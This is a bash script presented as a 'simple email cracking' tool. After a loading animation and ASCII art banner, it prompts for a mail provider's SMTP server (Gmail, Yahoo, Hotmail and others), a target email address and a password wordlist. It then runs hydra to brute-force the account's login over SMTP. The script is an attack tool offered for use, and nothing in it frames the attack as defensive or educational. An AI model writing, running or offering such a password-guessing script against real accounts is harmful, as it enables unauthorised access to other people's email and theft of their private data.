
#! /bin/bash
doSomeTask() {
  echo " <|> Moonlight <|> "
}

showLoading() {
  mypid=$!
  loadingText=$1

  echo -ne "$loadingText\r"

  while kill -0 $mypid 2>/dev/null; do
    echo -ne "$loadingText.\r"
    sleep 0.3
    echo -ne "$loadingText..\r"
    sleep 0.3
    echo -ne "$loadingText...\r"
    sleep 0.3
    echo -ne "\r\033[K"
    echo -ne "$loadingText\r"
    sleep 0.3
  done

  echo "$loadingText...FINISHED"
}

doSomeTask & showLoading "-LOADING ... "
echo -e "\033[31mSIMPLE EMAIL CRACKING\033[m" 
echo -e WRITTEN BY:"\033[32m
.....................MLMP...................
................Shadow<|>Stream............\033[m"
echo -e "\033[34m                                          
                    .  .  .                   
               .';;,,,,,,,:;...               
            .,::;,,,;;;:;,,:;,:c;.            
          .cl:;;;;:c.::c,;''l;;;:ol.          
         :d:::::l':ocl::::ccc:::::ll          
         :::ollcod;llccccol.dccco;.           
         ...ok;;d;,Ollllod'ldllld; .c,        
        .kxddoddxooOcdooodddoooodo  o;        
         oodOdxoodxkdkdddddddddod. 'O;        
         ;c ...   ;klollkOd...    ,OK.        
         .c,       .dOOkO.         .x         
         .kx       .0ocoO;         .d.        
        .xk      .c0:   ,0c.     .,xO.        
        .Ox;occlcdcl     c0xlc:l.lkdk         
         .okolloool:     .dllllkllco.         
           ....;xcll  .  :occlo:'.            
                'old,,.;loc::d.               
                .l:ccc;c:;o;l:                
                 ,':ll:;l;;:o.                
                   ',;;;;,''.
\033[m"
echo NOTE: Make sure you have wordlists!

echo -e Choose a SMTP service: Gmail = "\033[31msmtp.gmail.com\033[m" / Yahoo = "\033[31msmtp.mail.yahoo.com\033[m" / Hotmail = "\033[31msmtp.live.com\033[m" / Mail = "\033[31msmtp.mail.ru\033[m" / Rambler = "\033[31msmtp.rambler.ru\033[m" :
read smtp
echo Enter Email Address:
read email
echo Provide Directory of Wordlist for Passwords:
read wordlist
#xterm -e
hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp

